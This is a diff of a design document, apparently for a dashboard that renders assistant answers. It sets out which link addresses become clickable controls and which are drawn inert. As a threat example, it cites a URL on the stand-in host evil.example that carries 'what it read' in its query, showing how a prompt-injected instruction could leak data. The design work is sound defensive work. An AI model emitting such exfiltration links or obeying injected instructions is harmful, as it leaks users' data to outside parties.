@@ -3900,7 +3900,10 @@ configured code host, and an address on a configured host rebuilt from what
 it names, with no query or fragment. Any other address there is drawn
 inert, as written and with the host it names, readable and copyable and never
 a control, because `https://evil.example/?q=<what it read>` is how an
-injected instruction would carry words away ([ADR-0061](../../adr/0061-a-read-is-named-in-the-answer-never-drawn-as-a-card.md)).
+injected instruction would carry words away. An address an ask cites as
+evidence is the same: a button only when it is rebuilt on the company's host,
+labelled by the dashboard with the reference it is and its app's mark, and
+otherwise the address as written, never the asker's label ([ADR-0061](../../adr/0061-a-read-is-named-in-the-answer-never-drawn-as-a-card.md)).
 An outbound link a token makes opens a tab with `rel="noopener noreferrer"`
 and says so to a screen reader, as every outbound link in rendered Markdown
 does.
